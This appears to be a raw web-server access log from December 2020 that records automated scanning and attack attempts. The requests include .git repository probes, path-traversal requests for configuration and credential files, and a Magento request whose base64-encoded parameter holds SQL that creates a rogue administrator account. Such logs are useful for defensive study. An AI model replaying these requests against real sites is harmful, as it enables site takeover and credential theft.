103.71.85.73 - - [23/Dec/2020:02:35:39 +0100] "POST /user/register?element_parents=account%2Fmail%2F%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:40 +0100] "GET /sites/all/libraries/mailchimp/vendor/phpunit/phpunit/build.xml HTTP/1.1" 404 268 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:40 +0100] "GET /.git/HEAD HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:41 +0100] "GET /dev/.git/HEAD HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:41 +0100] "GET /stag/.git/HEAD HTTP/1.1" 404 220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:42 +0100] "GET /staging/.git/config HTTP/1.1" 404 225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:42 +0100] "GET /staging/.git/HEAD HTTP/1.1" 404 223 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:43 +0100] "GET /dev/.git/config HTTP/1.1" 404 221 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:43 +0100] "GET /prod/.git/HEAD HTTP/1.1" 404 220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:44 +0100] "GET /prod/.git/config HTTP/1.1" 404 222 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:44 +0100] "GET /local/.git/HEAD HTTP/1.1" 404 221 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:45 +0100] "GET /local/.git/config HTTP/1.1" 404 223 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:46 +0100] "GET /development/.git/HEAD HTTP/1.1" 404 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:46 +0100] "GET /development/.git/config HTTP/1.1" 404 229 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:47 +0100] "GET /test/.git/HEAD HTTP/1.1" 404 220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:48 +0100] "GET /test/.git/config HTTP/1.1" 404 222 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:49 +0100] "GET /api/.git/HEAD HTTP/1.1" 404 219 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
103.71.85.73 - - [23/Dec/2020:02:35:49 +0100] "GET /api/.git/config HTTP/1.1" 404 221 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
207.100.5.230 - - [23/Dec/2020:03:30:51 +0100] "GET /index.php?option=com_easyblog&view=dashboard&layout=write HTTP/1.1" 404 1397 "http://www.edgoad.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/D3117A87" "-"
192.180.114.240 - - [23/Dec/2020:04:20:35 +0100] "GET //admin//Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VybmFtZT0nZGxjJztERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZD02OTY5O0lOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYHVzZXJfaWRgLGBmaXJzdG5hbWVgLGBsYXN0bmFtZWAsYGVtYWlsYCxgdXNlcm5hbWVgLGBwYXNzd29yZGAsYGNyZWF0ZWRgLGBtb2RpZmllZGAsYGxvZ2RhdGVgLGBsb2dudW1gLGByZWxvYWRfYWNsX2ZsYWdgLGBpc19hY3RpdmVgLGBleHRyYWApIFZBTFVFUyAoNjk2OSwnbWFnZW50bycsJ2RldmVsb3BlcicsJ2RldmVsb3BlckBtYWdlbnRvY29tbWVyY2UuY29tJywnZGxjJywnY2ExZTY1MDdhNjMyYjA5ZDUwMDJhZjZiMmZjNzc5ZWU6TVEnLCcyMDE1LTA1LTA1IDA1OjA1OjA1JywnMjAxNS0wNS0wNSAwNTowNTowNScsJzIwMTUtMDUtMDUgMDU6MDU6MDUnLDEsMCwxLCdOOycpO0lOU0VSVCBJTlRPIGBhZG1pbl9yb2xlYCAoYHBhcmVudF9pZGAsYHRyZWVfbGV2ZWxgLGBzb3J0X29yZGVyYCxgcm9sZV90eXBlYCxgdXNlcl9pZGAsYHJvbGVfbmFtZWApIFZBTFVFUyAoMSwyLDAsJ1UnLDY5NjksJ2RldmVsb3BlcicpOzsgLS0g HTTP/1.1" 404 236 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:35 +0100] "GET /apache-log//admin//Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VybmFtZT0nZGxjJztERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZD02OTY5O0lOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYHVzZXJfaWRgLGBmaXJzdG5hbWVgLGBsYXN0bmFtZWAsYGVtYWlsYCxgdXNlcm5hbWVgLGBwYXNzd29yZGAsYGNyZWF0ZWRgLGBtb2RpZmllZGAsYGxvZ2RhdGVgLGBsb2dudW1gLGByZWxvYWRfYWNsX2ZsYWdgLGBpc19hY3RpdmVgLGBleHRyYWApIFZBTFVFUyAoNjk2OSwnbWFnZW50bycsJ2RldmVsb3BlcicsJ2RldmVsb3BlckBtYWdlbnRvY29tbWVyY2UuY29tJywnZGxjJywnY2ExZTY1MDdhNjMyYjA5ZDUwMDJhZjZiMmZjNzc5ZWU6TVEnLCcyMDE1LTA1LTA1IDA1OjA1OjA1JywnMjAxNS0wNS0wNSAwNTowNTowNScsJzIwMTUtMDUtMDUgMDU6MDU6MDUnLDEsMCwxLCdOOycpO0lOU0VSVCBJTlRPIGBhZG1pbl9yb2xlYCAoYHBhcmVudF9pZGAsYHRyZWVfbGV2ZWxgLGBzb3J0X29yZGVyYCxgcm9sZV90eXBlYCxgdXNlcl9pZGAsYHJvbGVfbmFtZWApIFZBTFVFUyAoMSwyLDAsJ1UnLDY5NjksJ2RldmVsb3BlcicpOzsgLS0g HTTP/1.1" 404 247 "-" "Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:36 +0100] "GET /apache-log/index.php/admin//Cms_Wysiwyg/directive/?forwarded=true&isIframe=true&___directive=e3tibG9jayB0eXBlPSJhZG1pbmh0bWwvcmVwb3J0X3NlYXJjaF9ncmlkIn19&filter=bnVtX3Jlc3VsdHNbZnJvbV09MCZudW1fcmVzdWx0c1tmaWVsZF9leHByXT0xPTIpO0RFTEVURSBGUk9NIGBhZG1pbl91c2VyYCBXSEVSRSB1c2VybmFtZT0nZGxjJztERUxFVEUgRlJPTSBgYWRtaW5fcm9sZWAgV0hFUkUgdXNlcl9pZD02OTY5O0lOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYHVzZXJfaWRgLGBmaXJzdG5hbWVgLGBsYXN0bmFtZWAsYGVtYWlsYCxgdXNlcm5hbWVgLGBwYXNzd29yZGAsYGNyZWF0ZWRgLGBtb2RpZmllZGAsYGxvZ2RhdGVgLGBsb2dudW1gLGByZWxvYWRfYWNsX2ZsYWdgLGBpc19hY3RpdmVgLGBleHRyYWApIFZBTFVFUyAoNjk2OSwnbWFnZW50bycsJ2RldmVsb3BlcicsJ2RldmVsb3BlckBtYWdlbnRvY29tbWVyY2UuY29tJywnZGxjJywnY2ExZTY1MDdhNjMyYjA5ZDUwMDJhZjZiMmZjNzc5ZWU6TVEnLCcyMDE1LTA1LTA1IDA1OjA1OjA1JywnMjAxNS0wNS0wNSAwNTowNTowNScsJzIwMTUtMDUtMDUgMDU6MDU6MDUnLDEsMCwxLCdOOycpO0lOU0VSVCBJTlRPIGBhZG1pbl9yb2xlYCAoYHBhcmVudF9pZGAsYHRyZWVfbGV2ZWxgLGBzb3J0X29yZGVyYCxgcm9sZV90eXBlYCxgdXNlcl9pZGAsYHJvbGVfbmFtZWApIFZBTFVFUyAoMSwyLDAsJ1UnLDY5NjksJ2RldmVsb3BlcicpOzsgLS0g HTTP/1.1" 404 256 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:36 +0100] "GET /apache-log/downloader/ HTTP/1.1" 404 228 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:36 +0100] "GET /downloader/ HTTP/1.1" 404 217 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:36 +0100] "GET /apache-log/magmi/web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 244 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:36 +0100] "GET /magmi/web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 233 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:36 +0100] "GET /apache-log/web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 238 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "GET /web/download_file.php?file=../conf/magmi.ini HTTP/1.1" 404 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "GET /apache-log/app/etc/local.xml HTTP/1.1" 404 234 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "GET /app/etc/local.xml HTTP/1.1" 404 223 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "GET /apache-log/magmi/web/download_file.php?file=../../app/etc/local.xml HTTP/1.1" 404 244 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "GET /magmi/web/download_file.php?file=../../app/etc/local.xml HTTP/1.1" 404 233 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "POST /apache-log/api/xmlrpc HTTP/1.1" 404 227 "-" "Magento" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "POST /api/xmlrpc HTTP/1.1" 404 216 "-" "Magento" "-"
192.180.114.240 - - [23/Dec/2020:04:20:37 +0100] "POST /apache-log/index.php/api/xmlrpc HTTP/1.1" 404 237 "-" "Magento" "-"
45.227.55.153 - - [23/Dec/2020:04:26:16 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36OPR/68.0.3618.173" "-"
45.227.55.153 - - [23/Dec/2020:04:26:16 +0100] "POST /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 188 "-" "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36OPR/68.0.3618.173" "-"
45.4.22.138 - - [23/Dec/2020:05:29:24 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(Linux;Android4.4.2;SM-T520)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
45.4.22.138 - - [23/Dec/2020:05:29:25 +0100] "POST /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 188 "-" "Mozilla/5.0(Linux;Android4.4.2;SM-T520)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
45.207.221.132 - - [23/Dec/2020:05:55:08 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(Linux;Android4.4.2;SM-T520)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
45.207.221.132 - - [23/Dec/2020:05:55:08 +0100] "POST /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 188 "-" "Mozilla/5.0(Linux;Android4.4.2;SM-T520)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
172.243.212.241 - - [23/Dec/2020:06:22:01 +0100] "GET /index.php?option=com_easyblog&view=dashboard&layout=write HTTP/1.1" 404 1397 "http://www.edgoad.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36" "-"
193.30.100.106 - - [23/Dec/2020:06:38:09 +0100] "POST /administrator/components/com_admin/views/sysinfo/tmpl/default.php HTTP/1.1" 404 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" "-"
168.80.127.91 - - [23/Dec/2020:06:49:29 +0100] "GET /index.php?option=com_easyblog&view=dashboard&layout=write HTTP/1.1" 404 1397 "http://www.edgoad.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" "-"
45.161.6.145 - - [23/Dec/2020:07:09:20 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(Linux;Android6.0;LG-K580)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.117MobileSafari/537.36" "-"
176.58.90.222 - - [23/Dec/2020:07:24:57 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(Linux;Android4.4.2;SM-T520)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
176.58.90.222 - - [23/Dec/2020:07:24:58 +0100] "POST /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 188 "-" "Mozilla/5.0(Linux;Android4.4.2;SM-T520)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
106.18.158.208 - - [23/Dec/2020:07:35:51 +0100] "GET /favicon.ico HTTP/1.1" 404 217 "http://www.edgoad.com/apache-log/access.log" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" "-"
192.162.16.126 - - [23/Dec/2020:08:11:34 +0100] "GET /index.php?option=com_easyblog&view=dashboard&layout=write HTTP/1.1" 404 1397 "http://www.edgoad.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/608.1.10 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" "-"
45.0.179.144 - - [23/Dec/2020:08:13:16 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(Linux;Android4.4.4;SM-T560)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
45.0.179.144 - - [23/Dec/2020:08:13:17 +0100] "POST /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 188 "-" "Mozilla/5.0(Linux;Android4.4.4;SM-T560)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36" "-"
45.227.31.153 - - [23/Dec/2020:08:34:13 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(Linux;Android9;SM-J330F)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138MobileSafari/537.36" "-"
45.227.31.153 - - [23/Dec/2020:08:34:13 +0100] "POST /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 188 "-" "Mozilla/5.0(Linux;Android9;SM-J330F)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138MobileSafari/537.36" "-"
45.156.57.141 - - [23/Dec/2020:08:42:01 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
45.156.57.141 - - [23/Dec/2020:08:42:02 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
174.115.170.138 - - [23/Dec/2020:08:44:07 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:08 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:18 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:20 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:21 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_content&view=article&id=49&Itemid=55" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:24 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:25 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_content&view=article&id=50&Itemid=56" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:28 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:29 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_phocagallery&view=category&id=1&Itemid=53" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:30 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_phocagallery&view=category&id=1&Itemid=53" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:36 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_phocagallery&view=category&id=1&Itemid=53" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:37 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_phocagallery&view=category&id=1&Itemid=53" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:41 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_phocagallery&view=category&id=1&Itemid=53" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
174.115.170.138 - - [23/Dec/2020:08:44:43 +0100] "GET /templates/_system/css/general.css HTTP/1.1" 404 239 "http://edgoad.com/index.php?option=com_phocagallery&view=category&id=1&Itemid=53" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
45.161.12.145 - - [23/Dec/2020:10:33:53 +0100] "GET /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 9873 "-" "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36OPR/68.0.3618.173" "-"
45.161.12.145 - - [23/Dec/2020:10:33:58 +0100] "POST /index.php?option=com_contact&view=contact&id=1 HTTP/1.1" 200 188 "-" "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36OPR/68.0.3618.173" "-"
49.210.216.207 - - [23/Dec/2020:10:44:40 +0100] "GET /favicon.ico HTTP/1.1" 404 217 "http://www.edgoad.com/apache-log/access.log" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36" "-"
34.67.118.201 - - [23/Dec/2020:10:46:01 +0100] "GET /favicon.ico HTTP/1.1" 404 217 "-" "Slackbot 1.0 (+https://api.slack.com/robots)" "-"
34.192.154.93 - - [23/Dec/2020:10:51:26 +0100] "GET /favicon.ico HTTP/1.1" 404 217 "http://www.edgoad.com/apache-log/access.log" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /apache-log/access.log&amp;sa=U&amp;ved=2ahUKEwiB7Nvp9OPtAhVQrVkKHckjCjwQFjBWegQIERAB&amp;usg=AOvVaw01UzADUHlK-uXEo2GAxU2o/magmi/web/magmi.php HTTP/1.1" 404 359 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /apache-log/access.log&amp;sa=U&amp;ved=2ahUKEwiB7Nvp9OPtAhVQrVkKHckjCjwQFjBWegQIERAB&amp;usg=AOvVaw01UzADUHlK-uXEo2GAxU2o/magmi/conf/magmi.ini HTTP/1.1" 404 360 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /apache-log/access.log&amp;sa=U&amp;ved=2ahUKEwiB7Nvp9OPtAhVQrVkKHckjCjwQFjBWegQIERAB&amp;usg=AOvVaw01UzADUHlK-uXEo2GAxU2o/downloader/index.php HTTP/1.1" 404 360 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /magmi/web/magmi.php HTTP/1.1" 404 225 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /magmi/conf/magmi.ini HTTP/1.1" 404 226 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /downloader/index.php HTTP/1.1" 404 226 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /apache-log/magmi/web/magmi.php HTTP/1.1" 404 236 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
139.191.178.162 - - [23/Dec/2020:11:42:11 +0100] "GET /apache-log/magmi/conf/magmi.ini HTTP/1.1" 404 237 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" "-"
